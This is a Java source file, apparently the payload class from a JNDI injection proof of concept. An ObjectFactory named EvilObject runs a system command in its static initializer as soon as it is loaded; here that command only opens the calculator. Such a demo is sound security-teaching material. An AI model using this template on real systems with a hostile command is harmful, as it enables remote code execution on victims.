import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class EvilObject implements ObjectFactory {
    static {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.startsWith("mac")) {
                // macOS
                Runtime.getRuntime().exec("open -a Calculator");
            } else if(os.startsWith("windows")) {
                // windows
                Runtime.getRuntime().exec("calc");
            }
        } catch(Exception ex) {
            ex.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return "攻击者创建的EvilObject对象";
    }

    public static void main(String[] args) {
        new EvilObject();
    }
}
